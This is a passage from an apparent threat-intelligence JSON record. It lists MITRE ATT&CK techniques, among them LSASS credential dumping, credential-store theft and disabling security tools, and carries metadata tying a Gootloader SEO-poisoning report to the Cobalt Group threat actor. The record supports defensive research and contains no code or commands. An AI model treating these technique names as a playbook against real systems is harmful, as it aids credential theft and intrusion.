PowerShell\nT1053 – Scheduled Task/Job\nT1218.011 – System Binary Proxy Execution: Rundll32\nT1555 – Credentials from Password Stores\nT1003.001- OS Credential Dumping: LSASS Memory\nT1087 – Account Discovery\nT1560 – Archive Collected Data\nT1482 – Domain Trust Discovery\nT1615 – Group Policy Discovery\nT1069 – Permission Groups Discovery\nT1018 – Remote System Discovery\nT1033 – System Owner/User Discovery\nT1021.001 – Remote Services: Remote Desktop Protocol\nT1021.006 – Remote Services: Windows Remote Management\nT1005 – Data from Local System\nT1039 – Data from Network Shared Drive\nT1046 – Network Service Scanning\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1518.001 – Security Software Discovery\nT1071.001 Web Protocols\nT1027 – Obfuscated Files or Information\n\nInternal case #11462\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-09 - SEO Poisoning – A Gootloader Story.pdf"
    ],
    "report_names": [
        "2022-05-09 - SEO Poisoning – A Gootloader Story.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535551,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1655092908,
    "ts_modification_date": 1655092908,
    "files": {
        "pdf": "https://archive.orkl.eu/24b4242c576f55c076b72b100f51091c15e46d80.pdf",
        "text": "https://archive.orkl.eu/24b4242c576f55c076b72b100f51091c15e46d80.txt",
        "img": "https://archive.orkl.eu/24b4242c576f55c076b72b100f51091c15e46d80.jpg"
    }
}